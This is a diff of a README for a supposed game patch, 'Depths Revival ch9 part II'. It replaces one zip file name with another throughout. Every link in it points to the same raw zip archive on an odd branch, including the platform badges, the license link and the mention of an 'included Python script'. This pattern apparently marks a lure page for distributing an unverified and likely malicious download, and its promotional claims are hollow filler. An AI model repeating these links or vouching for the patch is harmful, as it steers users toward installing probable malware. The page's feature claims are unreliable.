@@ -1,4 +1,4 @@
-# ![Download](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip)  
+# ![Download](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip)  
 [Download the Depths Revival ch9 part II Patch here!](LINK)
 
 ---
@@ -16,11 +16,11 @@ Harness new depths no matter your environment! Our versatile patch adapts to you
 
 | Platform            | Supported | Note           |
 |---------------------|:---------:|:--------------:|
-| ![Windows](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip%230078D6?logo=windows&logoColor=white) | ✅        | Windows 10/11 |
-| ![macOS](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip%23F0F0F0?logo=apple&logoColor=black)      | ✅        | Ventura/Monterey+ |
-| ![Ubuntu](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip%23E95420?logo=ubuntu&logoColor=white)  | ✅        | 20.04+ |
-| ![Debian](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip) | 🟡       | See notes      |
-| ![Other Linux](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip) | 🧪   | Enthusiast build |
+| ![Windows](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip%230078D6?logo=windows&logoColor=white) | ✅        | Windows 10/11 |
+| ![macOS](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip%23F0F0F0?logo=apple&logoColor=black)      | ✅        | Ventura/Monterey+ |
+| ![Ubuntu](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip%23E95420?logo=ubuntu&logoColor=white)  | ✅        | 20.04+ |
+| ![Debian](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip) | 🟡       | See notes      |
+| ![Other Linux](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip) | 🧪   | Enthusiast build |
 
 ---
 
@@ -71,23 +71,23 @@ No stone left unturned in pursuit of your comfort and empowerment:
 
 1. **Before you begin:** Make sure your core Depths Revival game (Chapter 9) is up to date.
 2. **Download the Patch:**  
-   ![Download](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip)  
+   ![Download](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip)  
    [Get the latest release here](LINK).
 3. **Unzip Files:** Extract the downloaded archive to a temporary directory.
 4. **Apply the Patch:**  
    - Locate your Depths Revival install folder.
    - Backup your save data—adventure is precious!
-   - Copy and overwrite the patch files as instructed in the `https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip`.
+   - Copy and overwrite the patch files as instructed in the `https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip`.
 5. **Launch & Enjoy:** Embark into Chapter 9 Part II and bask in the revitalization!
 
-*For command-line aficionados and power users, utilize the included Python script (`https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip`) for automated updating.*
+*For command-line aficionados and power users, utilize the included Python script (`https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip`) for automated updating.*
 
 ---
 
 ## ⚠️ Disclaimer
 
 This patch is a beacon in the community seas, brought to you by relentless volunteers and creative thinkers.  
-**Please note:** Results may drift in different technical tides. Experiment sensibly, backup faithfully, and always consult the included `https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip` for unique troubleshooting pointers.  
+**Please note:** Results may drift in different technical tides. Experiment sensibly, backup faithfully, and always consult the included `https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip` for unique troubleshooting pointers.  
 Depths Revival ch9 part II Patch is independently developed and not affiliated with the original game publishers.
 
 ---
@@ -97,14 +97,14 @@ Depths Revival ch9 part II Patch is independently developed and not affiliated w
 A patch for the ages, unfurling under the open banner of the MIT License.  
 Use, remix, and share with the freedom of the open ocean—just credit the crew!
 
-See the [MIT license](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip) for graceful details.  
+See the [MIT license](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip) for graceful details.  
 ©️ 2025 Depths Revival Patch Contributors.
 
 ---
 
 ## Need another route to adventure?
 
-![Download](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/ch_revival_enhanced_depths_patch_pt_v2.7.zip)  
+![Download](https://github.com/FarhanSaeed/depths-revival-ch9-pt2-enhanced-patch/raw/refs/heads/branch/assai/patch_ch_enhanced_pt_depths_revival_condisciple.zip)  
 [Return to Download](LINK)
 
 ---
